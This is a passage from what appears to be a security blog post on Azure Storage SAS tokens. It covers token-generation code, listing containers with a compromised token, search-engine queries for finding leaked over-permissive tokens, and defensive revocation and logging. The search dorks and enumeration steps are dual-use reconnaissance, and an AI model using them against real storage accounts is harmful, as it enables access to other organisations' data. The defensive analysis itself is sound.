&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ExpiresOn&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DateTime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UtcNow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AddMinutes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sasBuilder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SetPermissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ShareSasPermissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ShareSasPermissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ShareSasPermissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//multiple permissions can be added by using | symbol&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sasToken&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sasBuilder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ToSasQueryParameters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StorageSharedKeyCredential&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetKeyValueFromConnectionString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;AccountName&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetKeyValueFromConnectionString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;AccountKey&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;$&amp;#34;{new ShareClient(connectionString, containerName).Uri}?{sasToken}&amp;amp;restype=directory&amp;amp;comp=list&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h3&gt;User-delegated SAS&lt;span class=&#34;absolute -mt-20&#34; id=&#34;user-delegated-sas&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#user-delegated-sas&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A &amp;ldquo;user delegation&amp;rdquo; SAS allows for signing of the SAS token using an AzureAD account. This method allows for SAS creation without the need for account key usage.&lt;/p&gt;
&lt;p&gt;It is always recommended to use a User Delegation SAS when possible. A user delegation SAS provides additional security benefits compared to a service or an account SAS. User-delegated SAS tokens are only valid for a maximum of 7 days, any attempt to set the expiration date later than 7 days will result in failure. This makes them particularly tricky to compromise and is a metric that increases the overall security of the token.&lt;/p&gt;
&lt;p&gt;Below is an example of creation of a user delegated SAS token, the user has already authenticated to AzureAD user the az command.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;az&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;storage&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;account&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;list&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;primaryEndpoints&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;blob&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://jsteststorage111.blob.core.windows.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;dfs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://jsteststorage111.dfs.core.windows.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://jsteststorage111.file.core.windows.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;internetEndpoints&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;microsoftEndpoints&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;queue&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://jsteststorage111.queue.core.windows.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;table&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://jsteststorage111.table.core.windows.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;web&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://jsteststorage111.z33.web.core.windows.net/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;az&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;storage&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;container&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;generate-sas&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;--account-name&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;jsteststorage&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;--name&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;--permissions&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;acdlrw&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;--auth-mode&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;login&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;--as-user&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;--expiry&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2021-09-11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;se=2021-09-11&amp;amp;sp=racwdl&amp;amp;sv=2018-11-09&amp;amp;sr=c&amp;amp;skoid=e156ac44-6e88-4d07-9777-3716bd6dc45a&amp;amp;sktid=0339c78f-95d6-477b-a564-dd9e6f897c1b&amp;amp;skt=2021-09-10T17%3A54%3A34Z&amp;amp;ske=2021-09-11T00%3A00%3A00Z&amp;amp;sks=b&amp;amp;skv=2018-11-09&amp;amp;sig=vym9zUUuYUmSzp1%2BNoBGzC5YeXGBGVxtYxC7HAZgfTc%3D&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;&lt;strong&gt;Privately Accessible Storage Accounts&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;privately-accessible-storage-accounts&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#privately-accessible-storage-accounts&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now to look at the public access denied storage accounts. Visiting the endpoint gives quite a generic error that defines that public access is not permitted. This can be used to enumerate public vs private storage accounts. &lt;strong&gt;If the SAS token is compromised, the storage account is still accessible.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-14.png&#34; alt=&#34;image 14&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GET &lt;a href=&#34;https://jsteststorage111.blob.core.windows.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jsteststorage111.blob.core.windows.net/&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Error&amp;gt;
&amp;lt;Code&amp;gt;PublicAccessNotPermitted&amp;lt;/Code&amp;gt;
&amp;lt;Message&amp;gt;Public access is not permitted on this storage account. RequestId:54d84fc4-601e-0051-57a8-66d68b000000 Time:2020-07-30T19:34:11.0871138Z&amp;lt;/Message&amp;gt;
&amp;lt;/Error&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Using a compromised SAS token, again we have access to list the container; unlike the unauthenticated calls, with SAS tokens you can list container names. Below we generated an Account-Level SAS token to list the containers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GET &lt;a href=&#34;https://jsteststorage111.blob.core.windows.nett/?comp=list&amp;amp;restype=container&amp;amp;sv=2019-12-12&amp;amp;ss=bfqt&amp;amp;srt=sco&amp;amp;sp=rwdlacupx&amp;amp;se=2020-07-31T03:41:59Z&amp;amp;st=2020-07-30T19:41:59Z&amp;amp;spr=https&amp;amp;sig=XXXXX&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jsteststorage111.blob.core.windows.nett/?comp=list&amp;restype=container&amp;sv=2019-12-12&amp;ss=bfqt&amp;srt=sco&amp;sp=rwdlacupx&amp;se=2020-07-31T03:41:59Z&amp;st=2020-07-30T19:41:59Z&amp;spr=https&amp;sig=XXXXX&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;EnumerationResults ServiceEndpoint=&amp;#34;https://jsteststorage111.blob.core.windows.net/&amp;#34;&amp;gt;
&amp;lt;Containers&amp;gt;
&amp;lt;Container&amp;gt;
&amp;lt;Name&amp;gt;fd81344e-e9c1-4bfa-b64f-9e6380aea347&amp;lt;/Name&amp;gt;
&amp;lt;Properties&amp;gt;
&amp;lt;Last-Modified&amp;gt;Thu, 30 Jul 2020 15:16:12 GMT&amp;lt;/Last-Modified&amp;gt;
&amp;lt;Etag&amp;gt;&amp;#34;0x8D8349B7EC39B39&amp;#34;&amp;lt;/Etag&amp;gt;
&amp;lt;LeaseStatus&amp;gt;unlocked&amp;lt;/LeaseStatus&amp;gt;
&amp;lt;LeaseState&amp;gt;available&amp;lt;/LeaseState&amp;gt;
&amp;lt;PublicAccess&amp;gt;blob&amp;lt;/PublicAccess&amp;gt;
&amp;lt;DefaultEncryptionScope&amp;gt;$account-encryption-key&amp;lt;/DefaultEncryptionScope&amp;gt;
&amp;lt;DenyEncryptionScopeOverride&amp;gt;false&amp;lt;/DenyEncryptionScopeOverride&amp;gt;
&amp;lt;HasImmutabilityPolicy&amp;gt;false&amp;lt;/HasImmutabilityPolicy&amp;gt;
&amp;lt;HasLegalHold&amp;gt;false&amp;lt;/HasLegalHold&amp;gt;
&amp;lt;/Properties&amp;gt;
&amp;lt;/Container&amp;gt;
&amp;lt;/Containers&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This creates two possible attack vectors for malicious actors to leverage. They are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Knowing the storage account name, container name, and whether the container is set to allow anonymous access makes the storage account publicly accessible to anyone.&lt;/li&gt;
&lt;li&gt;Compromising a SAS token, depending on what permissions the SAS token has, will determine what level of compromise is possible. If the token is granted the list permission (&lt;strong&gt;&lt;em&gt;sp=*l*)&lt;/em&gt;&lt;/strong&gt; is granted &lt;strong&gt;&lt;em&gt;rt=sco&lt;/em&gt;&lt;/strong&gt; and has not expired, the storage account / service can be fully compromised.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;strong&gt;Enumerating Storage Accounts and SAS Tokens&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;enumerating-storage-accounts-and-sas-tokens&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#enumerating-storage-accounts-and-sas-tokens&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Services such as greyhat warfare (&lt;a href=&#34;https://buckets.grayhatwarfare.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://buckets.grayhatwarfare.com/&lt;/a&gt;)  provide the ability to search through publicly exposed and accessible Azure Storage Accounts. This is important to prevent public access to these blobs and file shares. Ensuring the appropriate SAS token hygiene and application logic is also paramount. &lt;/p&gt;
&lt;p&gt;Whilst services like greyhat warfare are great for looking into anonymous S3 buckets and storage accounts, this also highlights another potential risk; &lt;strong&gt;the disclosure of SAS tokens being cached by various search engines and searching services.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We conducted a mapping exercise on Azure Storage Accounts that had over permissive SAS tokens assigned to them:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DuckDuckGo - 25 +Storage accounts with rwdlacupx &lt;/li&gt;
&lt;li&gt;Google - 50+ Storage accounts with rwdlacupx  &lt;/li&gt;
&lt;li&gt;Bing - 10 + Storage accounts with rwdlacupx &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Queries to find SAS tokens are as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;site:core.windows.net rwdlacup - &lt;strong&gt;Looking for Account SAS’s&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;site:core.windows.net inurl:&amp;ldquo;sp=rl&amp;rdquo; - &lt;strong&gt;Looking for Read / List&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;site:core.windows.net inurl:&amp;ldquo;sp=rwl&amp;rdquo; - &lt;strong&gt;Looking for Read / Write / List&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;site:core.windows.net inurl:&amp;ldquo;sr=c&amp;rdquo; - &lt;strong&gt;Looking for Container-level Service SAS tokens&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Also looking for storage accounts within github code wielded alot of results, most of which pertained to SAS tokens that had not expired due to time, however the account key could have been cycled from within Azure.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-15.png&#34; alt=&#34;image 15&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;An attacker could facilitate a compromise of service just by using the exposed SAS token within Google&amp;rsquo;s search results. A SAS token with update, list, read and write permissions would allow an attacker to pull all files and potentially replace genuine served documentation with malware embedded documents. This in essence could facilitate compromise on the organization&amp;rsquo;s clients and internal staff. If the file share or blob storage is used for other documentation than static content, access to the client&amp;rsquo;s environment, and IP could lead to the full compromise of resources or usage as a watering hole for malware serving and deployment.&lt;/p&gt;
&lt;p&gt;Furthermore, after reviewing the github results, its clear organisations are not treating SAS tokens like specific credentials for resources, rather they are forgetting the importance of keeping the token safe.&lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;Defensive Controls and Mitigation&lt;/strong&gt;s&lt;/h1&gt;&lt;p&gt;In order to properly protect against this threat, organisations should start with the implementation of the correct business and application logic, whereby the SAS token is never leaked within the public domain. SAS tokens should be granted granularly and should be treated like API keys, in such they have the correct expiry and permissions set. &lt;/p&gt;
&lt;p&gt;The correct mitigating controls should be put in place to ensure that SAS tokens are only provisioned with the correct authorisation and once the administrator who is in control of the Storage Accounts, has provided the correct information for doing so. &lt;/p&gt;
&lt;h3&gt;Stored Access Policies &lt;span class=&#34;absolute -mt-20&#34; id=&#34;stored-access-policies&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#stored-access-policies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A stored access policy can be used to define a set of pre-existing parameters within the SAS token creation process. The policy can be chosen when creating a SAS token to ensure it adheres with the standard defined by policy. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The pros of using a Stored Access Policy to create SAS tokens are as follows:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;They can be defined by an administrator and as such have organisational controls over SAS tokens and their attributes. &lt;/li&gt;
&lt;li&gt;Misconfigurations of SAS tokens are less likely to occur due to an already defined policy being used to generate them.&lt;/li&gt;
&lt;li&gt;Revocation and invalidation require just a specific change or deletion of the policy in order to facilitate incident response.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From a defenders perspective, its crucial that storage accounts access is logged and monitored, this can be done Azure Monitor, a good reference to that can be found here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage?tabs=azure-portal&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage?tabs=azure-portal&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Revocation and Invalidation Planning&lt;span class=&#34;absolute -mt-20&#34; id=&#34;revocation-and-invalidation-planning&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#revocation-and-invalidation-planning&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;If a SAS is leaked, it can be used by anyone who obtains it, which can potentially compromise the storage account as such a method of revocation and invalidation is required as recovery for the instance in which a token is compromised.&lt;/p&gt;
&lt;p&gt;A method of invalidation is required to ensure that the SAS token, like API key or standard credentials can be revoked in real time. Luckily if the SAS token has been generated using the storage account key, in order to revoke the SAS token the administration need just cycle the account key, therefore invalidating the signature of the SAS token. If User-Delegation SAS tokens are compromised, the revoke-delegation-keys command revokes all of the user delegation keys associated with the specified storage account. This revokes all delegation keys that pertain to the storage account and as such renders them useless.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;az storage account revoke-delegation-keys \
    --name &amp;lt;storage-account&amp;gt; \
    --resource-group &amp;lt;resource-group&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Logging and Visibility&lt;span class=&#34;absolute -mt-20&#34; id=&#34;logging-and-visibility&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#logging-and-visibility&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Defenders can monitor Azure Storage accounts logs for any malicious traffic, that being the use of the &lt;strong&gt;&lt;em&gt;comp=list&lt;/em&gt;&lt;/strong&gt; parameter / value within the request. It&amp;rsquo;s unlikely a valid user who is accessing any publicly facing Storage Account will ever require listing the directories.&lt;/p&gt;
&lt;p&gt;The following request should be flagged as potentially nefarious, due to the &lt;strong&gt;comp=list:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347&lt;/a&gt;**?comp=list**&amp;amp;sv=2019-12-12&amp;amp;ss=bfqt&amp;amp;srt=sco&amp;amp;sp=rwdlacupx&amp;amp;se=2020-07-31T03:41:59Z&amp;amp;st=2020-07-30T19:41:59Z&amp;amp;spr=https&amp;amp;sig=REDACTED&lt;/p&gt;
&lt;h3&gt;Ingestion into Azure Sentinel&lt;span class=&#34;absolute -mt-20&#34; id=&#34;ingestion-into-azure-sentinel&#34;&gt;&lt;/span&gt;
